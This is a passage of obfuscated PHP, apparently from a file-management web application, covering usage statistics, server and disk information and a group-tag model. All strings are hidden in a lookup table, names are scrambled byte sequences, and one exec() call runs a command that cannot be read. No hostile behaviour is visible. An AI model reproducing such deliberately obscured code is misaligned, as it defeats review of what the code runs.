$€å¥û±Ì[743], $€å¥û±Ì[1730], $€å¥û±Ì[1731], $€å¥û±Ì[1732]))); if (!isset($≤¢êÅ•™[$…˛≈—¡˝])) { return !1; } $this->optionType = $≤¢êÅ•™[$…˛≈—¡˝][$€å¥û±Ì[33]]; $this->field = $≤¢êÅ•™[$…˛≈—¡˝][$€å¥û±Ì[277]]; return !0; } public function listData($ﬁ†ªë‹∏ = false, $Ÿœ¨Öâ´ = "\x6d\157\144\x69\x66\171\124\x69\x6d\145", $æãÄØô† = false) { return parent::listData($ﬁ†ªë‹∏, $Ÿœ¨Öâ´, $æãÄØô†); } public function trendList($¬◊¸ÅÚê) { $Ü≈åÆŒã =& $_SERVER[ëæªã÷]; $ﬂòÆ€±† = $this->listData(); if ($ﬂòÆ€±†) { $ù‹««∆£ = end($ﬂòÆ€±†); $„€Ü“¿• = date($Ü≈åÆŒã[1733], strtotime($Ü≈åÆŒã[1734])); if ($ù‹««∆£[$Ü≈åÆŒã[229]] == $„€Ü“¿•) { return $ﬂòÆ€±†; } $Ó÷∞ˆñ™ = strtotime($ù‹««∆£[$Ü≈åÆŒã[229]]); } if (!isset($Ó÷∞ˆñ™)) { $äÈù“≠¡ = $¬◊¸ÅÚê == $Ü≈åÆŒã[594] ? $Ü≈åÆŒã[538] : $Ü≈åÆŒã[805]; $Ó÷∞ˆñ™ = Model($äÈù“≠¡)->min($Ü≈åÆŒã[203]); } $”§Ÿ…‘Ñ = $Ü≈åÆŒã[1735] . ucfirst($¬◊¸ÅÚê); $ûÕáÈ√“ = $this->dateList($Ó÷∞ˆñ™); foreach ($ûÕáÈ√“ as $„€Ü“¿•) { $this->{$”§Ÿ…‘Ñ}($„€Ü“¿•); } return $this->listData(); } private function dateList($æçÈã◊Ô) { $ﬁ÷ı›≈Ï =& $_SERVER[ëæªã÷]; $˙¥·»⁄ü = $æçÈã◊Ô; $•î‘ô¶ß = strtotime($ﬁ÷ı›≈Ï[1734]); $„‘èââï = array(); while ($˙¥·»⁄ü <= $•î‘ô¶ß) { $„‘èââï[] = date($ﬁ÷ı›≈Ï[1733], $˙¥·»⁄ü); $˙¥·»⁄ü = strtotime($ﬁ÷ı›≈Ï[1736], $˙¥·»⁄ü); } return $„‘èââï; } public function _recordUser($’∂ëŒö… = '') { $’ß÷É‚ã =& $_SERVER[ëæªã÷]; $Ó≈úÀ«∏ = strtotime(date($’ß÷É‚ã[1737], strtotime($’∂ëŒö…))); $É•è›ÉÜ = strtotime(date($’ß÷É‚ã[1738], strtotime($’∂ëŒö…))); $Öêπá·ê = array($’ß÷É‚ã[203] => array($’ß÷É‚ã[989], $É•è›ÉÜ)); $ÙŒ≤æøâ = Model($’ß÷É‚ã[538])->where($Öêπá·ê)->count($’ß÷É‚ã[1628]); $Öêπá·ê[$’ß÷É‚ã[203]] = array($’ß÷É‚ã[337], array($Ó≈úÀ«∏, $É•è›ÉÜ)); $õ´ÍÂ∫± = Model($’ß÷É‚ã[538])->where($Öêπá·ê)->count($’ß÷É‚ã[1628]); $Öêπá·ê[$’ß÷É‚ã[33]] = $’ß÷É‚ã[1739]; $≠Ωü¨¬‹ = Model($’ß÷É‚ã[1740])->where($Öêπá·ê)->count($’ß÷É‚ã[1741]); $ëäΩ–∂€ = array($’ß÷É‚ã[229] => $’∂ëŒö…, $’ß÷É‚ã[745] => (int) $ÙŒ≤æøâ, $’ß÷É‚ã[1726] => (int) $õ´ÍÂ∫±, $’ß÷É‚ã[1727] => (int) $≠Ωü¨¬‹); return $this->insert($ëäΩ–∂€); } public function _recordStore($ç•ªÇû§ = '') { $‰ÿ§ù±Œ =& $_SERVER[ëæªã÷]; $ôÑ’†˝£ = strtotime(date($‰ÿ§ù±Œ[1738], strtotime($ç•ªÇû§))); $Ó¿ï⁄øπ = array($‰ÿ§ù±Œ[203] => array($‰ÿ§ù±Œ[989], $ôÑ’†˝£)); $¡›ÇÑ®ê = Model($‰ÿ§ù±Œ[470])->where($Ó¿ï⁄øπ)->sum($‰ÿ§ù±Œ[90]); $Ó¿ï⁄øπ[$‰ÿ§ù±Œ[411]] = 0; $Öô∆∂ﬁ• = Model($‰ÿ§ù±Œ[805])->where($Ó¿ï⁄øπ)->sum($‰ÿ§ù±Œ[90]); $Ó¿ï⁄øπ[$‰ÿ§ù±Œ[412]] = 1; $Îó∫⁄õ¸ = Model($‰ÿ§ù±Œ[805])->where($Ó¿ï⁄øπ)->sum($‰ÿ§ù±Œ[90]); $Ó¿ï⁄øπ[$‰ÿ§ù±Œ[412]] = 2; $øˆè¬—’ = Model($‰ÿ§ù±Œ[805])->where($Ó¿ï⁄øπ)->sum($‰ÿ§ù±Œ[90]); $Û˚™ØÁî = array($‰ÿ§ù±Œ[229] => $ç•ªÇû§, $‰ÿ§ù±Œ[743] => (int) $Öô∆∂ﬁ•, $‰ÿ§ù±Œ[1730] => (int) $¡›ÇÑ®ê, $‰ÿ§ù±Œ[1731] => (int) $Îó∫⁄õ¸, $‰ÿ§ù±Œ[1732] => (int) $øˆè¬—’); return $this->insert($Û˚™ØÁî); } public function trend($„Ã≤ÉÖ‹, $¬∫Ûãµ˘) { $±ìúﬂ”Ü =& $_SERVER[ëæªã÷]; if (!$this->init($„Ã≤ÉÖ‹)) { return !1; } $÷Û∫ÃΩ≥ = $this->trendList($„Ã≤ÉÖ‹); if ($÷Û∫ÃΩ≥ && $¬∫Ûãµ˘ != $±ìúﬂ”Ü[1601]) { $ﬁÛÁó√¡ = $÷Û∫ÃΩ≥[0][$±ìúﬂ”Ü[229]]; $€ßòè˝≠ = $this->validDate($¬∫Ûãµ˘, $ﬁÛÁó√¡); $Ï¬°Ü¢Û = array(); $±ÁÓô¬¯ = array_to_keyvalue($÷Û∫ÃΩ≥, $±ìúﬂ”Ü[229]); foreach ($€ßòè˝≠ as $õŸªË˛∞) { if (isset($±ÁÓô¬¯[$õŸªË˛∞])) { $“ÙÍ°Ωˆ = $±ÁÓô¬¯[$õŸªË˛∞]; } else { $“ÙÍ°Ωˆ = end($÷Û∫ÃΩ≥); $“ÙÍ°Ωˆ[$±ìúﬂ”Ü[229]] = $õŸªË˛∞; if ($„Ã≤ÉÖ‹ == $±ìúﬂ”Ü[594]) { $“ÙÍ°Ωˆ[$±ìúﬂ”Ü[1726]] = $“ÙÍ°Ωˆ[$±ìúﬂ”Ü[1727]] = 0; } } $Ï¬°Ü¢Û[] = $“ÙÍ°Ωˆ; } $÷Û∫ÃΩ≥ = $Ï¬°Ü¢Û; } $á≈ ÍÔ∂ = array($±ìúﬂ”Ü[594] => array($±ìúﬂ”Ü[745] => LNG($±ìúﬂ”Ü[1742]), $±ìúﬂ”Ü[1726] => LNG($±ìúﬂ”Ü[1743]), $±ìúﬂ”Ü[1727] => LNG($±ìúﬂ”Ü[1744])), $±ìúﬂ”Ü[1728] => array($±ìúﬂ”Ü[743] => LNG($±ìúﬂ”Ü[1745]), $±ìúﬂ”Ü[1730] => LNG($±ìúﬂ”Ü[1746]), $±ìúﬂ”Ü[1731] => LNG($±ìúﬂ”Ü[1747]), $±ìúﬂ”Ü[1732] => LNG($±ìúﬂ”Ü[1748]))); $£ë„‡ôã = array($±ìúﬂ”Ü[594] => $±ìúﬂ”Ü[1749], $±ìúﬂ”Ü[1728] => $±ìúﬂ”Ü[90]); if (empty($÷Û∫ÃΩ≥)) { $õŸªË˛∞ = date($±ìúﬂ”Ü[1733], strtotime($±ìúﬂ”Ü[1734])); $ÆÃ˙¢Áô = array($±ìúﬂ”Ü[229] => $õŸªË˛∞); foreach ($á≈ ÍÔ∂[$„Ã≤ÉÖ‹] as $◊Ω”áˆ¬ => $å¡ì¨¶˙) { $ÆÃ˙¢Áô[$◊Ω”áˆ¬] = 0; } $÷Û∫ÃΩ≥[] = $ÆÃ˙¢Áô; } $ãüØﬂ˝Å = array(); foreach ($÷Û∫ÃΩ≥ as $å¡ì¨¶˙) { if ($„Ã≤ÉÖ‹ == $±ìúﬂ”Ü[1728] && $å¡ì¨¶˙[$±ìúﬂ”Ü[1730]] > $å¡ì¨¶˙[$±ìúﬂ”Ü[743]]) { $å¡ì¨¶˙[$±ìúﬂ”Ü[1730]] = $å¡ì¨¶˙[$±ìúﬂ”Ü[743]]; } foreach ($á≈ ÍÔ∂[$„Ã≤ÉÖ‹] as $◊Ω”áˆ¬ => $öÖıÅ˜™) { $“ÙÍ°Ωˆ = array($±ìúﬂ”Ü[229] => $å¡ì¨¶˙[$±ìúﬂ”Ü[229]], $±ìúﬂ”Ü[1528] => $öÖıÅ˜™); $“ÙÍ°Ωˆ[$£ë„‡ôã[$„Ã≤ÉÖ‹]] = isset($å¡ì¨¶˙[$◊Ω”áˆ¬]) ? $å¡ì¨¶˙[$◊Ω”áˆ¬] : 0; $ãüØﬂ˝Å[] = $“ÙÍ°Ωˆ; } } return $ãüØﬂ˝Å; } public function validDate($Â©Œ·âè, $ôŸ’Ó¨ô) { $÷√∞Ö¸æ =& $_SERVER[ëæªã÷]; $±∆≥˝À = date($÷√∞Ö¸æ[1733], strtotime($÷√∞Ö¸æ[1734])); $âﬁı““ = array($±∆≥˝À); switch ($Â©Œ·âè) { case $÷√∞Ö¸æ[1608]: $âÛ„¯≥• = mktime(0, 0, 0, date($÷√∞Ö¸æ[1750]), date($÷√∞Ö¸æ[1349]) - date($÷√∞Ö¸æ[1412]) + 7 - 7, date($÷√∞Ö¸æ[1751])); $¨æ—È¿É = 0; do { $Æº¯”≥¥ = date($÷√∞Ö¸æ[1733], $âÛ„¯≥• - 3600 * 24 * 7 * $¨æ—È¿É); $âﬁı““[] = $Æº¯”≥¥; $¨æ—È¿É++; } while ($ôŸ’Ó¨ô < $Æº¯”≥¥); break; case $÷√∞Ö¸æ[1606]: $¨æ—È¿É = 1; do { $øù£ÕÒå = date($÷√∞Ö¸æ[1752], strtotime("\x2d\x20{$¨æ—È¿É}\40\x6d\x6f\x6e\x74\x68\163")); $âﬁı““[] = $øù£ÕÒå; $¨æ—È¿É++; } while ($ôŸ’Ó¨ô < $øù£ÕÒå); break; case $÷√∞Ö¸æ[1753]: $∏øÃçú÷ = (int) date($÷√∞Ö¸æ[1751], strtotime($ôŸ’Ó¨ô)); $©É¡∫∫ = (int) date($÷√∞Ö¸æ[1751]); if ($∏øÃçú÷ >= $©É¡∫∫) { break; } for ($∏øÃçú÷; $∏øÃçú÷ < $©É¡∫∫; $∏øÃçú÷++) { $âﬁı““[] = $∏øÃçú÷ . $÷√∞Ö¸æ[1754]; } break; default: break; } if ($ôŸ’Ó¨ô > end($âﬁı““)) { array_pop($âﬁı““); } sort($âﬁı““); return $âﬁı““; } public function listTable($Œı⁄ÎÎ∫) { $¨·√˜‹∂ = ucfirst($Œı⁄ÎÎ∫); return Model($¨·√˜‹∂)->listData(); } public function option($èä±∫§ü) { $˛å“ùã† = $_SERVER[ëæªã÷][1755] . ucfirst($èä±∫§ü); return $this->{$˛å“ùã†}(); } private function optionUser() { $¶∆¿Ò¨ì =& $_SERVER[ëæªã÷]; $¶öÕ¶ã‘ = Model($¶∆¿Ò¨ì[538])->count($¶∆¿Ò¨ì[1628]); $£›∞≥Ö‹ = Model($¶∆¿Ò¨ì[538])->where($¶∆¿Ò¨ì[1756])->count($¶∆¿Ò¨ì[1628]); $´ê”à¢¢ = intval($GLOBALS[$¶∆¿Ò¨ì[6]][$¶∆¿Ò¨ì[353]][$¶∆¿Ò¨ì[1584]]) / 3600; $Ÿ÷ü®ﬁ® = strtotime("\x2d{$´ê”à¢¢}\x20\x68\x6f\165\x72\x73"); $¿ˆºâ…Œ = strtotime(date($¶∆¿Ò¨ì[1737])); if ($Ÿ÷ü®ﬁ® < $¿ˆºâ…Œ) { $Ÿ÷ü®ﬁ® = $¿ˆºâ…Œ; } $æÀíÂ¶˛ = array($¶∆¿Ò¨ì[1757] => array($¶∆¿Ò¨ì[990], $Ÿ÷ü®ﬁ®)); $ÌÀè≈∞‰ = (int) Model($¶∆¿Ò¨ì[538])->where($æÀíÂ¶˛)->count($¶∆¿Ò¨ì[1628]); if (!$ÌÀè≈∞‰) { $ÌÀè≈∞‰ = 1; } $æÀíÂ¶˛ = array($¶∆¿Ò¨ì[1757] => array($¶∆¿Ò¨ì[990], $¿ˆºâ…Œ)); $á¿˝›¢ﬁ = Model($¶∆¿Ò¨ì[538])->where($æÀíÂ¶˛)->count($¶∆¿Ò¨ì[1628]); return array($¶∆¿Ò¨ì[739] => (int) $¶öÕ¶ã‘, $¶∆¿Ò¨ì[1758] => (int) ($¶öÕ¶ã‘ - $£›∞≥Ö‹), $¶∆¿Ò¨ì[1759] => (int) $£›∞≥Ö‹, $¶∆¿Ò¨ì[1760] => (int) $á¿˝›¢ﬁ, $¶∆¿Ò¨ì[1761] => $ÌÀè≈∞‰); } private function optionFile() { $∞ã’ÇŒ„ =& $_SERVER[ëæªã÷]; $éÎƒË§— = $this->sourceSize(); $ƒÿÂ˜Ÿß = $éÎƒË§—[$∞ã’ÇŒ„[90]]; $≠Œ˙ó™˛ = $éÎƒË§—[$∞ã’ÇŒ„[1730]]; $´œ≥Œ„≤ = Model($∞ã’ÇŒ„[805])->where(array($∞ã’ÇŒ„[411] => 0))->count($∞ã’ÇŒ„[403]); $ƒØØ«Ïì = array($∞ã’ÇŒ„[411] => 0, $∞ã’ÇŒ„[203] => array($∞ã’ÇŒ„[990], strtotime(date($∞ã’ÇŒ„[1737])))); $Ó≠˝èÆç = Model($∞ã’ÇŒ„[805])->where($ƒØØ«Ïì)->sum($∞ã’ÇŒ„[90]); $≤ä⁄˙˛ = Model($∞ã’ÇŒ„[805])->where($ƒØØ«Ïì)->count($∞ã’ÇŒ„[403]); return array($∞ã’ÇŒ„[743] => $ƒÿÂ˜Ÿß, $∞ã’ÇŒ„[1730] => $≠Œ˙ó™˛, $∞ã’ÇŒ„[1762] => $ƒÿÂ˜Ÿß - $≠Œ˙ó™˛, $∞ã’ÇŒ„[1763] => (int) $Ó≠˝èÆç, $∞ã’ÇŒ„[745] => (int) $´œ≥Œ„≤, $∞ã’ÇŒ„[1764] => (int) $≤ä⁄˙˛); } private function optionAccess() { $ÉÆŸÃí¯ =& $_SERVER[ëæªã÷]; return array($ÉÆŸÃí¯[739] => $this->typeLogCnt(), $ÉÆŸÃí¯[118] => $this->typeLogCnt($ÉÆŸÃí¯[118]), $ÉÆŸÃí¯[450] => $this->typeLogCnt($ÉÆŸÃí¯[450]), $ÉÆŸÃí¯[1765] => $this->typeLogCnt($ÉÆŸÃí¯[1765]), $ÉÆŸÃí¯[1766] => $this->typeLogCnt($ÉÆŸÃí¯[1766]), $ÉÆŸÃí¯[594] => $this->typeLogCnt($ÉÆŸÃí¯[12], $ÉÆŸÃí¯[1741])); } private function typeLogCnt($›‹ËŒÍ˝ = '', $≠‚Î°ÿÇ = "\151\x64") { $‰°≠¸∂± =& $_SERVER[ëæªã÷]; $ê”Îú’¥ = array($‰°≠¸∂±[118] => array($‰°≠¸∂±[1767], $‰°≠¸∂±[1768]), $‰°≠¸∂±[450] => array($‰°≠¸∂±[1769], $‰°≠¸∂±[1770]), $‰°≠¸∂±[1765] => array($‰°≠¸∂±[1771], $‰°≠¸∂±[1772], $‰°≠¸∂±[1773]), $‰°≠¸∂±[1766] => array($‰°≠¸∂±[1774], $‰°≠¸∂±[1775]), $‰°≠¸∂±[1776] => array($‰°≠¸∂±[1777], $‰°≠¸∂±[1778], $‰°≠¸∂±[1779])); $≈œ†’‡∂ = strtotime(date($‰°≠¸∂±[1737])); $∑∫µÎ‰¥ = array($‰°≠¸∂±[203] => array($‰°≠¸∂±[990], $≈œ†’‡∂)); if ($›‹ËŒÍ˝) { $∑∫µÎ‰¥[$‰°≠¸∂±[33]] = array($‰°≠¸∂±[7], $ê”Îú’¥[$›‹ËŒÍ˝]); } $›€Åî¡∞ = Model($‰°≠¸∂±[1740])->where($∑∫µÎ‰¥)->count($≠‚Î°ÿÇ); return (int) $›€Åî¡∞; } private function optionServer() { $°°˘ã˘Ø =& $_SERVER[ëæªã÷]; $∫®Ò£ç” = $this->diskDriver(); $ä¿ÓÚΩß = KodIO::defaultDriver(); $™Ï˝ÀÈœ = array($°°˘ã˘Ø[797] => $ä¿ÓÚΩß[$°°˘ã˘Ø[401]]); $Õö√íØú = Model($°°˘ã˘Ø[470])->where($™Ï˝ÀÈœ)->sum($°°˘ã˘Ø[90]); $·∫ÿ«Û◊ = explode($°°˘ã˘Ø[53], $_SERVER[$°°˘ã˘Ø[150]]); $®⁄•˝’‰ = $·∫ÿ«Û◊[0]; $õø’©˛Ä = $GLOBALS[$°°˘ã˘Ø[6]][$°°˘ã˘Ø[21]]; $∂ÄªØ∂© = $õø’©˛Ä[$°°˘ã˘Ø[952]]; if ($∂ÄªØ∂© == $°°˘ã˘Ø[940]) { $¢ÙÙıÇœ = explode($°°˘ã˘Ø[1246], $õø’©˛Ä[$°°˘ã˘Ø[951]]); $∂ÄªØ∂© = $¢ÙÙıÇœ[0]; } if ($∂ÄªØ∂© == $°°˘ã˘Ø[888] || $∂ÄªØ∂© == $°°˘ã˘Ø[784]) { $√íÇ›Õπ = Model()->db()->query($°°˘ã˘Ø[1780]); $ïå‡Í√∑ = $√íÇ›Õπ[0] && isset($√íÇ›Õπ[0][$°°˘ã˘Ø[1527]]) ? $√íÇ›Õπ[0][$°°˘ã˘Ø[1527]] : 0; $∂ÄªØ∂© = $°°˘ã˘Ø[1781] . ($ïå‡Í√∑ ? $°°˘ã˘Ø[8] . $ïå‡Í√∑ : $°°˘ã˘Ø[12]); } $≥˛úÅÑ¸ = $GLOBALS[$°°˘ã˘Ø[6]][$°°˘ã˘Ø[353]][$°°˘ã˘Ø[807]]; return array($°°˘ã˘Ø[1782] => $∫®Ò£ç” ? $∫®Ò£ç”[$°°˘ã˘Ø[1783]] : 0, $°°˘ã˘Ø[1784] => $∫®Ò£ç” ? $∫®Ò£ç”[$°°˘ã˘Ø[1785]] : 0, $°°˘ã˘Ø[1786] => (int) $ä¿ÓÚΩß[$°°˘ã˘Ø[1783]] * 1024 * 1024 * 1024, $°°˘ã˘Ø[1787] => (int) $Õö√íØú, $°°˘ã˘Ø[1788] => ucfirst($®⁄•˝’‰), $°°˘ã˘Ø[1789] => $°°˘ã˘Ø[1790] . PHP_VERSION, $°°˘ã˘Ø[1791] => phpBuild64() ? 64 : 32, $°°˘ã˘Ø[738] => str_replace($°°˘ã˘Ø[1106], $°°˘ã˘Ø[968], $∂ÄªØ∂©), $°°˘ã˘Ø[353] => ucfirst($≥˛úÅÑ¸), $°°˘ã˘Ø[32] => $_SERVER[$°°˘ã˘Ø[1792]]); } private function diskDriver() { $‡€ÇÃﬁﬂ =& $_SERVER[ëæªã÷]; $Èˆ•⁄˜ﬂ = $‡€ÇÃﬁﬂ[8]; $¢ª∂ÉµŒ = $GLOBALS[$‡€ÇÃﬁﬂ[6]][$‡€ÇÃﬁﬂ[1262]] == $‡€ÇÃﬁﬂ[1263]; if ($¢ª∂ÉµŒ) { $Èˆ•⁄˜ﬂ = $‡€ÇÃﬁﬂ[1793]; if (function_exists($‡€ÇÃﬁﬂ[1794])) { exec($‡€ÇÃﬁﬂ[1795], $›˙ŸÅèÒ); $Èˆ•⁄˜ﬂ = $›˙ŸÅèÒ[1] . $‡€ÇÃﬁﬂ[8]; } } if (!file_exists($Èˆ•⁄˜ﬂ)) { return; } $≥ÜèÄÄ∞ = @disk_total_space($Èˆ•⁄˜ﬂ); $‰ÏÕπÕ÷ = $≥ÜèÄÄ∞ - @disk_free_space($Èˆ•⁄˜ﬂ); return array($‡€ÇÃﬁﬂ[1783] => $≥ÜèÄÄ∞, $‡€ÇÃﬁﬂ[1785] => $‰ÏÕπÕ÷); } public function fileChart($€ïÒ¿˚œ) { $Å‹≈üÚù =& $_SERVER[ëæªã÷]; if (isset($€ïÒ¿˚œ[$Å‹≈üÚù[1628]])) { return Model($Å‹≈üÚù[805])->userFileTypeProfile($€ïÒ¿˚œ[$Å‹≈üÚù[1628]]); } if (isset($€ïÒ¿˚œ[$Å‹≈üÚù[1796]])) { return Model($Å‹≈üÚù[805])->groupFileTypeProfile($€ïÒ¿˚œ[$Å‹≈üÚù[1796]]); } $ÇÍ÷Ø∂ô = $this->sourceSize(); $≈æÌ˝úä = array($Å‹≈üÚù[498] => 0, $Å‹≈üÚù[412] => 1); $ıÜÁøüﬁ = Model($Å‹≈üÚù[805])->where($≈æÌ˝úä)->sum($Å‹≈üÚù[90]); $≈æÌ˝úä[$Å‹≈üÚù[412]] = 2; $ÇÓ”æáÉ = Model($Å‹≈üÚù[805])->where($≈æÌ˝úä)->sum($Å‹≈üÚù[90]); return array($Å‹≈üÚù[743] => $ÇÍ÷Ø∂ô[$Å‹≈üÚù[90]], $Å‹≈üÚù[1730] => $ÇÍ÷Ø∂ô[$Å‹≈üÚù[1730]], $Å‹≈üÚù[1731] => (int) $ıÜÁøüﬁ, $Å‹≈üÚù[1732] => (int) $ÇÓ”æáÉ); } private function sourceSize() { $±ﬂÖ·ΩÍ =& $_SERVER[ëæªã÷]; $∆àÕ ù“ = Model($±ﬂÖ·ΩÍ[805])->where(array($±ﬂÖ·ΩÍ[411] => 0))->sum($±ﬂÖ·ΩÍ[90]); $µıÎ‰¸≠ = Model($±ﬂÖ·ΩÍ[470])->sum($±ﬂÖ·ΩÍ[90]); if ($µıÎ‰¸≠ > $∆àÕ ù“) { $µıÎ‰¸≠ = $∆àÕ ù“; } return array($±ﬂÖ·ΩÍ[90] => (int) $∆àÕ ù“, $±ﬂÖ·ΩÍ[1730] => (int) $µıÎ‰¸≠); } } goto B∞ï“›ˆŸã; eó†´‘∆ñë: class GroupTagModel extends ModelBase { protected $tableName = "\165\x73\145\x72\137\146\x61\x76"; protected function cacheFunctionAlias($±ÌÅÒÕû) { $îﬂ´ÁÌè =& $_SERVER[ëæªã÷]; return array($îﬂ´ÁÌè[1902] => array($±ÌÅÒÕû[0], $îﬂ´ÁÌè[1903]), $îﬂ´ÁÌè[1904] => array($±ÌÅÒÕû[0], $îﬂ´ÁÌè[1905])); } protected function get($Äı—ÓÌ¯) { $ÙÉÆ„ü∫ =& $_SERVER[ëæªã÷]; $˜©Ñ∑µá = Model($ÙÉÆ„ü∫[522])->metaGet($Äı—ÓÌ¯, $ÙÉÆ„ü∫[1906]); $ÓÒìÛó¯ = json_decode($˜©Ñ∑µá, !0); return $ÓÒìÛó¯ ? $ÓÒìÛó¯ : array($ÙÉÆ„ü∫[1907] => $ÙÉÆ„ü∫[99], $ÙÉÆ„ü∫[373] => array()); } protected function set($ÜÓÃà≠®, $ñ‚Î≈áú) { $éÈ´ÅÍÖ =& $_SERVER[ëæªã÷]; $ñ‚Î≈áú = $ñ‚Î≈áú ? $ñ‚Î≈áú : array($éÈ´ÅÍÖ[1907] => $éÈ´ÅÍÖ[99], $éÈ´ÅÍÖ[373] => array()); Model($éÈ´ÅÍÖ[522])->metaSet($ÜÓÃà≠®, $éÈ´ÅÍÖ[1906], json_encode($ñ‚Î≈áú)); return Model($éÈ´ÅÍÖ[522])->metaSet($ÜÓÃà≠®, $éÈ´ÅÍÖ[1906], json_encode($ñ‚Î≈áú)); } protected function getByTagID($“Ù˘îô¥, $œ°ÖÌÂç) { $π¿ﬁŸÖ¥ =& $_SERVER[ëæªã÷]; if (!$“Ù˘îô¥ || !$œ°ÖÌÂç) { return !1; } if (!Model($π¿ﬁŸÖ¥[522])->getInfoSimple($“Ù˘îô¥)) { return !1; } $—ßò≠”Ï = $this->get($“Ù˘îô¥); if (!$—ßò≠”Ï || !isset($—ßò≠”Ï[$π¿ﬁŸÖ¥[373]])) { return !1; } $ëÂúØöÚ = array_find_by_field($—ßò≠”Ï[$π¿ﬁŸÖ¥[373]], $π¿ﬁŸÖ¥[401], $œ°ÖÌÂç); return is_array($ëÂúØöÚ) ? $ëÂúØöÚ : !1; } public function listSource($â˙«Ïãé, $ﬁçøÖ∫Ë) { $√á˘¥⁄ï =& $_SERVER[ëæªã÷]; if ($ﬁçøÖ∫Ë && !is_array($ﬁçøÖ∫Ë)) { $ﬁçøÖ∫Ë = array($ﬁçøÖ∫Ë); } $Ûçï€åÛ = $this->listData($â˙«Ïãé); $ù„ª≥ÁÀ = array(); foreach ($Ûçï€åÛ as $ÄÈ„À‘ú) { $ÉËππ◊¬ = $ÄÈ„À‘ú[$√á˘¥⁄ï[88]]; if (!$ÉËππ◊¬) { continue; } if (!isset($ù„ª≥ÁÀ[$ÉËππ◊¬])) { $ù„ª≥ÁÀ[$ÉËππ◊¬] = array(); } $ù„ª≥ÁÀ[$ÉËππ◊¬][] = $ÄÈ„À‘ú[$√á˘¥⁄ï[427]]; } $¿ŸÙÂ£Ø = array(); foreach ($ù„ª≥ÁÀ as $Æ¿πø‘Â => $’˝∑úÜı) { $πµŒÍ®∂ = !0; if (!$ﬁçøÖ∫Ë) { $¿ŸÙÂ£Ø[] = $Æ¿πø‘Â; continue; } foreach ($ﬁçøÖ∫Ë as $å¬Úƒµﬁ) { if (!in_array($å¬Úƒµﬁ, $’˝∑úÜı)) { $πµŒÍ®∂ = !1; break; } } if ($πµŒÍ®∂) { $¿ŸÙÂ£Ø[] = $Æ¿πø‘Â; } } if (!$¿ŸÙÂ£Ø) { return array(); } $„°´ÿ•à = array($√á˘¥⁄ï[418] => array($√á˘¥⁄ï[419], $¿ŸÙÂ£Ø), $√á˘¥⁄ï[504] => $â˙«Ïãé, $√á˘¥⁄ï[412] => SourceModel::TYPE_GROUP); $„·≠≠µ¯ = Model($√á˘¥⁄ï[1301])->listSource($„°´ÿ•à); if (!$„·≠≠µ¯ || count($¿ŸÙÂ£Ø) == $„·≠≠µ¯[$√á˘¥⁄ï[370]][$√á˘¥⁄ï[371]]) { return $„·≠≠µ¯; } $Æ∂¸£∞– = array(); $éœœÛºÂ = array_to_keyvalue($„·≠≠µ¯[$√á˘¥⁄ï[87]], $√á˘¥⁄ï[12], $√á˘¥⁄ï[403]); $⁄ÈÛıé = array_to_keyvalue($„·≠≠µ¯[$√á˘¥⁄ï[86]], $√á˘¥⁄ï[12], $√á˘¥⁄ï[403]); $•∏·‡í˝ = array_merge($⁄ÈÛıé, $éœœÛºÂ); foreach ($¿ŸÙÂ£Ø as $ÉËππ◊¬) { if (!in_array($ÉËππ◊¬, $•∏·‡í˝)) { $Æ∂¸£∞–[] = $ÉËππ◊¬; } } if ($Æ∂¸£∞–) { $this->removeBySource($â˙«Ïãé, $Æ∂¸£∞–); } return $„·≠≠µ¯; } protected function listData($ÄèÇÊëÖ) { $†»ã¿”À =& $_SERVER[ëæªã÷]; $É≈ﬁ¬é = array($†»ã¿”À[1619] => 0, $†»ã¿”À[483] => array($†»ã¿”À[1908], 0), $†»ã¿”À[423] => $†»ã¿”À[1909] . $ÄèÇÊëÖ); $ô¸ΩÍ˛ì = $†»ã¿”À[1910]; $˝ÌÏñ˝É = $this->field($ô¸ΩÍ˛ì)->where($É≈ﬁ¬é)->order($†»ã¿”À[1911])->select(); return $˝ÌÏñ˝É ? $˝ÌÏñ˝É : array(); } protected function addToTag($ÎÛÓ‰Ÿ‚, $¨ò˚∆óò, $Á•√“çË) { $≠æ´É∑ë =& $_SERVER[ëæªã÷]; if (!$this->getByTagID($ÎÛÓ‰Ÿ‚, $Á•√“çË) || !$¨ò˚∆óò) { return !1; } if (!Model($≠æ´É∑ë[805])->pathInfo($¨ò˚∆óò)) { return !1; } $‘ôµ¸îŒ = array($≠æ´É∑ë[1619] => 0, $≠æ´É∑ë[483] => $Á•√“çË, $≠æ´É∑ë[422] => $¨ò˚∆óò, $≠æ´É∑ë[423] => $≠æ´É∑ë[1912] . $ÎÛÓ‰Ÿ‚, $≠æ´É∑ë[421] => $≠æ´É∑ë[12], $≠æ´É∑ë[1800] => 0); if ($this->where($‘ôµ¸îŒ)->find()) { return !1; } return $this->add($‘ôµ¸îŒ); } protected function removeFromTag($Çè¸Ω€√, $¯ŒÈ‘Ø≥, $à˚ÕÃë¡) { $≤ƒ≥óﬁ® =& $_SERVER[ëæªã÷]; if (!$this->getByTagID($Çè¸Ω€√, $à˚ÕÃë¡) || !$¯ŒÈ‘Ø≥) { return !1; } if (is_array($¯ŒÈ‘Ø≥)) { $¯ŒÈ‘Ø≥ = array($≤ƒ≥óﬁ®[7], $¯ŒÈ‘Ø≥); } $ŸûÄÕ∫˙ = array($≤ƒ≥óﬁ®[1619] => 0, $≤ƒ≥óﬁ®[483] => $à˚ÕÃë¡, $≤ƒ≥óﬁ®[423] => $≤ƒ≥óﬁ®[1912] . $Çè¸Ω€√, $≤ƒ≥óﬁ®[422] => $¯ŒÈ‘Ø≥); return $this->where($ŸûÄÕ∫˙)->delete(); } protected function removeByTag($“ö™´Øë, $å›©Áô°) { $ç…±ì  =& $_SERVER[ëæªã÷]; if (!$this->getByTagID($“ö™´Øë, $å›©Áô°)) { return !1; } $æúëÚÒ« = array($ç…±ì [1619] => 0, $ç…±ì [483] => $å›©Áô°, $ç…±ì [423] => $ç…±ì [1912] . $“ö™´Øë); return $this->where($æúëÚÒ«)->delete(); } protected function removeBySource($§Øß–”¿, $†–Ú“Ã∆) { $⁄∫˘Àç¬ =& $_SERVER[ëæªã÷]; if (!$§Øß–”¿ || !$†–Ú“Ã∆) { return !1; } if (is_array($†–Ú“Ã∆)) { $†–Ú“Ã∆ = array($⁄∫˘Àç¬[7], $†–Ú“Ã∆); } $æª‡∆¬Ã = array($⁄∫˘Àç¬[1619] => 0, $⁄∫˘Àç¬[422] => $†–Ú“Ã∆, $⁄∫˘Àç¬[483] => array($⁄∫˘Àç¬[990], 0), $⁄∫˘Àç¬[423] => $⁄∫˘Àç¬[1912] . $§Øß–”¿); return $this->where($æª‡∆¬Ã)->delete(); } } class 